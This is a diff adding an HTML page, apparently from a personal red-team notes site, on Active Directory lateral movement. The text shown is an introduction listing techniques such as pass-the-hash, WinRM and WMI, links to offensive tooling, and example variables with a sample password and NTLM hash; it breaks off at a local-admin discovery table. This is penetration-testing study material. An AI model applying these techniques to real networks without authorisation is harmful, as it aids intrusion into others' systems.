@@ -1,0 +1,3035 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="yunni">
+      
+      
+        <link rel="canonical" href="https://yunniperka.github.io/RedHub/AD/Lateral_Movement/">
+      
+      
+        <link rel="prev" href="../ACL_Abuse/">
+      
+      
+        <link rel="next" href="../Priv_Escalation/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Lateral Movement - RedHub</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Code"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#lateral-movement" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            RedHub
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Lateral Movement
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    RedHub
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Windows
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Active Directory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AD_Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Initial_Recon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Unauth_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Unauthenticated Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Auth_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authenticated Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Credential_Access/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Credential Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Kerberos_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NTLM_Relay_and_Coercion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NTLM Relay & Coercion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ACL_Abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ACL Abuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#local-admin-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Local Admin Discovery
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb-admin-shares" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SMB Admin Shares
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#psexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PsExec
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#winrm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WinRM
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#wmi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WMI
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dcom" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DCOM
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RDP
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scheduled-tasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scheduled Tasks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#services" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Services
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remote-registry" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remote Registry
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pass-the-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pass the Hash
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pass-the-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pass the Ticket
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-movement-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lateral Movement Checklist
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Priv_Escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Domain_Compromise/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Domain Compromise
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Persistance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Persistance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cross_Forest_and_Trusts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cross Forest & Trusts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Toolset/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Toolset
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Initial_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SQL_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SSTI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI (Server Side Template Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Command_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/XXE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE (XML External Entity Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Cypher_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cypher Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS (Cross-Site Scripting)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF (Server-Side Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF (Cross-Site Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/File_Inclusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/File_Upload/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/IDOR/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDOR (Insecure Direct Object Reference)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking & Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Networking & Infrastructure
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Networking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modern Architecture
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Modern Architecture
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cloud/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Containers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Containers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Virtualization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Virtualization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="lateral-movement">Lateral Movement</h1>
+<p>Lateral movement is the process of moving from one system to another after obtaining valid credentials, hashes, tickets, or a session.</p>
+<p>In Active Directory environments, lateral movement usually depends on:</p>
+<ul>
+<li>local administrator rights</li>
+<li>remote management protocols</li>
+<li>SMB admin shares</li>
+<li>WinRM</li>
+<li>WMI</li>
+<li>DCOM</li>
+<li>RDP</li>
+<li>scheduled tasks</li>
+<li>services</li>
+<li>Kerberos tickets</li>
+<li>NTLM hashes</li>
+</ul>
+<p>Useful resources:</p>
+<ul>
+<li><a href="https://www.thehacker.recipes/ad/movement/">The Hacker Recipes - Movement</a></li>
+<li><a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html">HackTricks - Active Directory Methodology</a></li>
+<li><a href="https://www.netexec.wiki/">NetExec Documentation</a></li>
+<li><a href="https://github.com/fortra/impacket">Impacket</a></li>
+<li><a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a></li>
+<li><a href="https://wadcoms.github.io/">WADComs</a></li>
+</ul>
+<p>Basic variables used in examples:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">NETBIOS</span><span class="o">=</span>CORP
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">export</span><span class="w"> </span><span class="nv">USER</span><span class="o">=</span>alice
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password123!&#39;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nb">export</span><span class="w"> </span><span class="nv">NTLM</span><span class="o">=</span><span class="s1">&#39;8846f7eaee8fb117ad06bdd830b7586c&#39;</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DC_IP</span><span class="o">=</span><span class="m">10</span>.10.10.10
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DC_HOST</span><span class="o">=</span>dc01.corp.local
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TARGET</span><span class="o">=</span><span class="m">10</span>.10.10.20
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TARGET_HOST</span><span class="o">=</span>filesrv01.corp.local
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="nb">export</span><span class="w"> </span><span class="nv">RANGE</span><span class="o">=</span><span class="m">10</span>.10.10.0/24
+</span></code></pre></div>
+<hr />
+<h2 id="local-admin-discovery">Local Admin Discovery</h2>
+<p>Local admin discovery identifies where the current credential has administrative rights.</p>
+<p>Administrative rights are important because most lateral movement methods require local admin on the target host.</p>
+<p>Common indicators of local admin:</p>
+<table>
+<thead>
+<tr>
+<th>Indicator</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SMB admin shares accessible</td>
+<td>Possible local admin.</td>
+</tr>
+<tr>
